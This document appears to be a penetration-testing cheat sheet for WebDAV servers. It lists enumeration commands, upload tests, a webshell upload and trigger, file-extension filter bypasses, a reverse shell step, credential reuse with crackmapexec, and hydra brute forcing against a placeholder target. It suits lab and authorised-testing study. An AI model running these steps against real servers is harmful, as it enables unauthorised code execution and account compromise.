# WebDAV Enumeration & Exploitation

## Purpose

This file provides a structured workflow for identifying and exploiting WebDAV services.

Core rules:

* WebDAV extends HTTP with file management
* Writable WebDAV = potential RCE
* Always check allowed methods
* Always test upload + execution

---

## 0. Identify WebDAV

Common ports:

* 80
* 443

Look for:

* DAV headers
* unusual directories

```bash
nmap -p 80,443 --script http-methods <IP>
```

---

## 1. Check Allowed Methods

```bash
curl -X OPTIONS http://<IP>
```

Look for:

* PUT
* DELETE
* PROPFIND
* MOVE

If PUT allowed:
→ possible upload

---

## 2. Directory Discovery

```bash
gobuster dir -u http://<IP> -w wordlist.txt
```

Look for:

* /webdav
* /uploads
* /files

---

## 3. WebDAV Enumeration Tools

```bash
davtest -url http://<IP>/webdav
```

```bash
cadaver http://<IP>/webdav
```

---

## 4. Authentication Check

Try:

* anonymous access
* default credentials
* reused credentials

---

## 5. Upload Test (CRITICAL)

```bash
curl -T test.txt http://<IP>/webdav/test.txt
```

If success:
→ writable WebDAV

---

## 6. Using Cadaver

```bash
cadaver http://<IP>/webdav
```

Commands:

```bash
ls
put file
get file
```

---

## 7. Upload Webshell

```bash
put shell.php
```

---

## 8. Trigger Execution

```bash
http://<IP>/webdav/shell.php
```

---

## 9. Extension Filtering Bypass

Try:

* .php.txt
* .php.jpg
* .phtml
* .asp / .aspx

---

## 10. Reverse Shell

Upload:

* PHP reverse shell
* ASPX shell (Windows)

Trigger via browser.

---

## 11. Credential Reuse

Test WebDAV creds on:

```bash
crackmapexec smb <IP> -u user -p pass
crackmapexec winrm <IP> -u user -p pass
```

---

## 12. Brute Force (If Needed)

```bash
hydra -L users.txt -P passwords.txt http-get://<IP>/webdav
```

---

## 13. Pivot Opportunities

WebDAV can lead to:

* webshell access
* credential discovery
* file uploads into web root

---

## 14. If Upload Fails

Try:

* different directories
* different extensions
* authentication

---

## 15. If Stuck

RESET:

* re-check methods
* re-run davtest
* test multiple file types
* check execution paths

---

## 16. Mental Model

* WebDAV = file upload over HTTP
* Upload = potential execution
* Execution = shell

---

## 17. Golden Rules

* Always check OPTIONS
* Always run davtest
* Always test upload
* Always attempt webshell execution
